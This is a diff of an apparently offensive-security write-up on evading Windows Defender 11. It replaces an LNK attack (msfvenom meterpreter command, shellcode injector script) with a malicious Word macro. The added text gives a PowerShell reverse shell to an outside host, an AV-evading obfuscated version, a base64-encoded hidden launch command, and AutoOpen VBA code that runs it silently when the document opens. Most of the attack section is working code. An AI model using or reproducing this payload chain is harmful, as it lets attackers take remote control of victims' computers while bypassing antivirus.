@@ -2,7 +2,7 @@
 
 - [**Outline**](#section-0)
 - [**Windows Defender  Explanation**](#section-1)
-- [**LNK Files**](#section-2)
+- [**Word Document VBA Macro**](#section-2)
 - [ **Proof of Concept - Bypassing 2023 Windows Defender 11**](#section-3)
 
 
@@ -10,62 +10,71 @@
 
 ## Outline  {#section-0}
 
-The objective of this document is to explore evasion techniques concerning the latest security measures implemented within Windows Defender 11. Upon clicking on the seemingly benign Notepad looking file, the lnk file downloads both obfuscated AMSI bypass script alongside a shell code process injector script. This effectivly disables Windows Defender and the attacker gains an interactive meterpreter shell.
+The objective of this document is to explore evasion techniques concerning the latest security measures implemented within Windows Defender 11. Specifically, the aim is to execute a reverse shell from a Microsoft Word document. The ultimate goal is to achieve Remote Code Execution (RCE) within the context of NT/Authority System privileges upon opening the malicious Word document.
 
 ![](/assets/AV/Final.png)  
 
 # Windows Defender   {#section-1}
 Windows Defender 11 is Microsoft's built-in antivirus and antimalware solution. It provides real-time protection against various threats like viruses, ransomware, spyware, and other malicious software. Defender scans files, monitors activities, and offers firewall protection, all to help safeguard your system and data from potential security risks. Additionally, it includes features such as cloud-based protection and regular updates to ensure comprehensive defense against evolving threats.
 
-# LNK Exploitation{#section-2}
+# Word Document VBA Macro {#section-2}
 
-An LNK file, short for Shell Link Binary File, is a file type associated with Windows shortcuts. LNK files typically serve as pointers to executable files or applications, allowing users to quickly access programs or documents. However, in a malicious context, an LNK file can be crafted to download and execute a Defender bypass script along with a shell code injector. This technique is employed in cyberattacks to evade detection by security tools and gain unauthorized access or control over a target system. Similar to Word document macros, the malicious LNK file exploits the execution capabilities of its associated application to carry out unauthorized actions on the compromised system.
+A Word document VBA macro is a script embedded within a Word document that uses Visual Basic for Applications (VBA) to automate tasks or perform certain functions within the document. Macros can execute commands, manipulate data, or interact with external systems.
 
-# LNK Expolitation Proof of Concept {#section-3}
-<img src="/assets/AV/LNK.gif" width="1500" height="2500"/>
-Create a meterpreter shell to be injected.
+In the context of Word document macros, a malicious macro might attempt to establish this reverse shell connection, allowing an attacker to control the compromised system remotely. This is often used as part of cyberattacks to gain unauthorized access or control over a victim's computer.
 
+Despite its decades-long existence, this technique may appear outdated, with the assumption that modern security measures, such as Windows Defender, would effectively detect and prevent its exploitation. However, the significance lies in the persistent effectiveness of this method, especially when combined with custom obfuscation. 
+
+# Evasion Proof of Concept {#section-3}
+<img src="/assets/AV/FinalMacro.gif" width="1500" height="2500"/>
+
+First the tester retrieved one of the most well-known generic powershell reverse shells on the internet. This with no doubt is flagged by every single anti-virus
 ```bash
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.20.131 LPORT=443 EXITFUNC=process -f ps1
-```
-Prepare a shell code injector payload to paste the generated shell code
-
-```bash
-$Kernel32 = @"
-using System;
-using System.Runtime.InteropServices;
-
-public class Kernel32 {
-    [DllImport("kernel32")]
-    public static exter IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-    [DllImport("kernel32", CharSet=CharSet.Ansi)]
-    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStckSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-    [DllImport("kernel32.dll", SetastError=true)]
-    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
-}
-"@
-
-Add-Type $Kernel32
-
-[Byte[]] $buf = <Shell Code Here>
-
-
-$size = $buf.Length
-
-[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
-
-[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
-
-$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
-
-[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
+$client = New-Object System.Net.Sockets.TCPClient('legitwebsite.com',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
 ```
-Encoding the powershell with base64.
+However when the tester manually applied custom obfuscation techniques such as random comments and string substitution as seen in the below code, windows defender did not flag the content as malicious. 
 
-Prepare a Bypass Script and conduct obfuscation. This step is hidden for potential abuse cases
+```bash
 
-Create a LNK shortcut file that downlaods both the bypass script and shell code injector.
+$client = <# Suspendisse imperdiet lacus eu tellus pellentesque suscipit > New-Object Syste''m.Net.Sockets.TCPClient('legitwebsite.com',80); <# Suspendisse korean github   websiteellentesque suscipit #> $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0}; <# Healthy subject to eat with #>while(($i = $stream.Read($bytes, 0, $bytes.  Length)) -ne 0){;$data = (New-Object -TypeName <# Suspendisse imperdiet lacus eu tellus pellentesque suscipit #> System.Text.ASCIIEncoding).GetString($bytes,0, $i);  $sendback = (ie""x'' $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (gl).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write  ($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() <# aslkd;l l;ka;skd;lkasd dalskd;laksdl;kasdksasdcipit #>  
 
+```
+With the payload sucessfully obfuscated the tester encoded the the powershell with base64.
 
+```bash
+
+powershell.exe -exec bypass -enc IAAkAGMAbABpAGUAbgB0ACAAPQAgADwAIwAgAFMAdQBzACAAJABjAGwAaQBlAG4AdAAgAD0AIAA8ACMAIABTAHUAcwBwAGUAbgBkAGkAcwBzAGUAIABpAG0AcABlAHIAZABpAGUAdAAgAGwAYQBjAHUAcwAgAGUAdQAgAHQAZQBsAGwAdQBzACAAcABlAGwAbABlAG4AdABlAHMAcQB1AGUAIABzAHUAcwBjAGkAcABpAHQAIAAjAD4AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlACcAJwBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADgALgB0AGMAcAAuAHUAcwAtAGMAYQBsAC0AMQAuAG4AZwByAG8AawAuAGkAbwAnACwAMQAzADYANAAwACkAOwAgADwAIwAgAFMAdQBzAHAAZQBuAGQAaQBzAHMAZQAgAGsAbwByAGUAYQBuACAAZwBpAHQAaAB1AGIAIAB3AGUAYgBzAGkAdABlAGUAbABsAGUAbgB0AGUAcwBxAHUAZQAgAHMAdQBzAGMAaQBwAGkAdAAgACMAPgAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7ACAAPAAjACAASABlAGEAbAB0AGgAeQAgAHMAdQBiAGoAZQBjAHQAIAB0AG8AIABlAGEAdAAgAHcAaQB0AGgAIAAjAD4AdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAPAAjACAAUwB1AHMAcABlAG4AZABpAHMAcwBlACAAaQBtAHAAZQByAGQAaQBlAHQAIABsAGEAYwB1AHMAIABlAHUAIAB0AGUAbABsAHUAcwAgAHAAZQBsAGwAZQBuAHQAZQBzAHEAdQBlACAAcwB1AHMAYwBpAHAAaQB0ACAAIwA+ACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAIgAiAHgAJwAnACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAZwBsACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkAIAA8ACMAIABhAHMAbABrAGQAOwBsACAAbAA7AGsAYQA7AHMAawBkADsAbABrAGEAcwBkACAAZABhAGwAcwBrAGQAOwBsAGEAawBzAGQAbAA7AGsAYQBzAGQAawBzAGEAcwBkAGMAaQBwAGkAdAAgACMAPgAKAA==
+
+```
+Crafting the Payload in Word Document VBA we get the following.
+
+```bash
+Sub AutoOpen()
+    MyMacro
+End Sub
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+Dim facebook
+facebook = "powershell.exe -nop -w hidden -e IAAkAGMAbABpAGUAbgB0ACAAPQAgADwAIwAgAFMAdQBzAHAAZQBuAGQAaQBzAHMAZQAgAGkAbQBwAGUAcgBkAGkAZQB0ACAAbABhAGMAdQBzACAAZQB1ACAAdABlAGwAbAB1AHM" _
+& "AIABwAGUAbABsAGUAbgB0AGUAcwBxAHUAZQAgAHMAdQBzAGMAaQBwAGkAdAAgACMAPgAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAJwAnAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGw" _
+& "AaQBlAG4AdAAoACcANAAuAHQAYwBwAC4AdQBzAC0AYwBhAGwALQAxAC4AbgBnAHIAbwBrAC4AaQBvACcALAAxADIAOAA4ADAAKQA7ACAAPAAjACAAUwB1AHMAcABlAG4AZABpAHMAcwBlACAAawBvAHIAZQBhAG4AIABnAGk" _
+& "AdABoAHUAYgAgAHcAZQBiAHMAaQB0AGUAZQBsAGwAZQBuAHQAZQBzAHEAdQBlACAAcwB1AHMAYwBpAHAAaQB0ACAAIwA+ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACg" _
+& "AKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAIAA8ACMAIABIAGUAYQBsAHQAaAB5ACAAcwB1AGIAagBlAGMAdAAgAHQAbwAgAGUAYQB0ACAAdwBpAHQ" _
+& "AaAAgACMAPgB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHs" _
+& "AOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIAA8ACMAIABTAHUAcwBwAGUAbgBkAGkAcwBzAGUAIABpAG0AcABlAHIAZABpAGUAdAAgAGwAYQBjAHUAcwAgAGU" _
+& "AdQAgAHQAZQBsAGwAdQBzACAAcABlAGwAbABlAG4AdABlAHMAcQB1AGUAIABzAHUAcwBjAGkAcABpAHQAIAAjAD4AIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGU" _
+& "AdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQAiACIAeAAnACcAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHI" _
+& "AaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABnAGwAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHk" _
+& "AdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQ" _
+& "AZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACg" _
+& "AKQAgADwAIwAgAGEAcwBsAGsAZAA7AGwAIABsADsAawBhADsAcwBrAGQAOwBsAGsAYQBzAGQAIABkAGEAbABzAGsAZAA7AGwAYQBrAHMAZABsADsAawBhAHMAZABrAHMAYQBzAGQAYwBpAHAAaQB0ACAAIwA+AA=="
+Call Shell(facebook, vbHide)
+End Sub
+```
+
+In order to reduce detection rate, the tester conducted a VBA Stomping method , however left it out for potential abuse cases.
 
